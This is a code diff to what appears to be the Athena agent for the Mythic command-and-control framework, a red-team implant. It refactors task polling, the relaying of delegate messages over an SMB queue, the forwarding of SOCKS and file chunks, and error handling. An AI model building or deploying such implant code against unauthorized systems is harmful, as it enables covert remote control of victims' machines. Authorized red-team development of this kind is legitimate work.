@@ -8,7 +8,6 @@ using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
 using System.Net;
 using System.Threading.Tasks;
 
@@ -62,7 +61,7 @@ namespace Athena
             {
                 action = "get_tasking",
                 tasking_size = -1,
-                delegates = Globals.delegateMessages ?? new List<DelegateMessage>(),
+                delegates = Globals.mc.MythicConfig.smbConfig.GetMessages(),
                 //socks = Globals.socksHandler.getMessages() ?? new List<SocksMessage>(),
                 socks = new List<SocksMessage>()
             };
@@ -70,10 +69,14 @@ namespace Athena
             try
             {
                 var responseString = this.MythicConfig.currentConfig.Send(gt).Result;
-                
+
+                if (String.IsNullOrEmpty(responseString))
+                {
+                    return null;
+                }
+
                 GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString); 
-                Globals.delegateMessages.Clear();
-                //Globals.bagOut.Clear();
+
                 //This can be cleaned up.
                 if (gtr != null)
                 {
@@ -89,14 +92,13 @@ namespace Athena
                     {
                         foreach(var del in gtr.delegates)
                         {
-                            Globals.outMessages.Add(del);
+                            Globals.mc.MythicConfig.smbConfig.AddToQueue(del);
                         }
                     }
                     return gtr.tasks;
                 }
                 else
                 {
-                    Misc.WriteDebug("GTR = null");
                     return null;
                 }
             }
@@ -286,13 +288,18 @@ namespace Athena
                 action = "post_response",
                 responses = lrr,
                 socks = Globals.socksHandler.getMessages() ?? new List<SocksMessage>(),
-                delegates = Globals.delegateMessages ?? new List<DelegateMessage>()
+                delegates = Globals.mc.MythicConfig.smbConfig.GetMessages(),
             };
 
             try
             {
                 var responseString = this.MythicConfig.currentConfig.Send(prr).Result;
-                Globals.delegateMessages.Clear();
+
+                if (string.IsNullOrEmpty(responseString))
+                {
+                    return false;
+                }
+
                 if (responseString.Contains("chunk_data"))
                 {
                     PostUploadResponseResponse cs = JsonConvert.DeserializeObject<PostUploadResponseResponse>(responseString);
@@ -308,7 +315,7 @@ namespace Athena
                         {
                             foreach (var del in cs.delegates)
                             {
-                                Globals.outMessages.Add(del);
+                                Globals.mc.MythicConfig.smbConfig.AddToQueue(del);
                             }
                         }
                         //Pass up socks messages
@@ -320,10 +327,13 @@ namespace Athena
                             }
                         }
 
+
+                        //I think there might be issues when downloading and uploading files at the same time
                         foreach (var response in cs.responses)
                         {
                             //Spin off new thread to upload new chunks
-
+                            //Todo Change this to make use of an object instead of trying to mess with threads. (Example how SOCKS is handled)
+                            //e.g. create an UploadChunk(int chunkNum, byte[] chunkData);
                             if (!String.IsNullOrEmpty(response.chunk_data))
                             {
                                 //Spin up new task to handle uploads
@@ -363,12 +373,6 @@ namespace Athena
                 }
                 else
                 {
-                    if (string.IsNullOrEmpty(responseString))
-                    {
-                        //We failed to get a response from the server
-                        return false;
-                    }
-
                     PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
 
                     //Check for socks messages to pass on
@@ -385,11 +389,12 @@ namespace Athena
                     {
                         foreach (var del in cs.delegates)
                         {
-                            Globals.outMessages.Add(del);
+                            Globals.mc.MythicConfig.smbConfig.AddToQueue(del);
                         }
                     }
 
-                    //Check for socks messages to pass on
+                    //Todo Change this to make use of an object instead of trying to mess with threads. (Example how SOCKS is handled)
+                    //Check for file chunks to pass on
                     foreach (var response in cs.responses)
                     {
                         if (!String.IsNullOrEmpty(response.file_id))
@@ -406,7 +411,7 @@ namespace Athena
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
+                Misc.WriteDebug(e.Message);
                 return false;
             }
             return true;
